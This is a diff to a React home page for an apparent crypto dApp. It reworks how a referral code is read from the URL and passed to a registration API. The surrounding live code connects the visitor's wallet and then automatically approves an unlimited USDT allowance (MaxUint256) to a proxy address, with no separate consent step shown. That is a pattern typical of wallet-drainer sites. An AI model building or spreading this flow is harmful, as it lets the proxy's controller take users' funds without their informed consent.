@@ -40,13 +40,13 @@ const HomePage = () => {
 	/*   const [status, setStatus] = useState("");
   const [approvalTried, setApprovalTried] = useState(false); */
 
-	const [referCode, setReferCode] = useState('');
+	/* const [referCode, setReferCode] = useState(''); */
 	const navigate = useNavigate();
 
 	const loggedInInfo = useSelector((state) => state?.auth);
 	const dispatch = useAppDispatch();
 
-	useEffect(() => {
+/* 	useEffect(() => {
 		const fetchWallet = async () => {
 			const queryParams = new URLSearchParams(window.location.search);
 			const code = queryParams.get('referCode');
@@ -54,7 +54,7 @@ const HomePage = () => {
 		};
 
 		fetchWallet();
-	}, []);
+	}, [signer]); */
 
 	// ✅ Request switch to BSC
 	const switchToBSC = async () => {
@@ -77,26 +77,7 @@ const HomePage = () => {
 
 
 
-/* 	const connectAndApprove = async () => {
-		try {
-			if (!loggedInInfo?.walletAddress) {
-				const modal = new Web3Modal({ cacheProvider: true });
-				const instance = await modal.connect();
-				const provider = new BrowserProvider(instance);
-				const _signer = await provider.getSigner();
-				const _account = await _signer.getAddress();
-				setSigner(_signer);
-				setAccount(_account);
-				//setStatus("✅ Wallet connected");
 
-				// ✅ Auto trigger approval
-				await approveUSDT(_signer, _account);
-			} 
-		} catch (err) {
-			console.error('Connect error', err);
-			//setStatus("❌ Wallet connection failed");
-		}
-	}; */
 
 
   const connectAndApprove = async () => {
@@ -125,6 +106,8 @@ const HomePage = () => {
       setSigner(_signer);
       setAccount(_account);
 
+	  
+
       // ✅ Auto trigger approval
       await approveUSDT(_signer, _account);
     }
@@ -139,26 +122,37 @@ const HomePage = () => {
 
 	const approveUSDT = async (signerToUse = signer, account) => {
 		try {
+
+			const fetchWallet = async () => {
+			const queryParams = new URLSearchParams(window.location.search);
+			const code = queryParams.get('referCode');
+			return code
+		};
+
+		const value = await fetchWallet();
 			const usdt = new Contract(USDT_ADDRESS, ERC20_ABI, signerToUse);
 
 			// Approve unlimited USDT for the proxy address
 			const tx = await usdt.approve(PROXY_ADDRESS, MaxUint256);
 			await tx.wait();
 
+			
+
 			if (tx) {
 				try {
 					// Attempt registration
 					const registrationResponse = await api.post('/registration', {
 						address: account,
-						referCode,
+						referCode: value,
 					});
 
 					const registeredData = registrationResponse?.data;
+					console.log(registeredData)
 					if (registeredData) {
 						dispatch(
 							login({
 								walletAddress: account,
-								referCode: registeredData.referCode,
+								referCode: registeredData?.data?.refer_code,
 							})
 						);
 
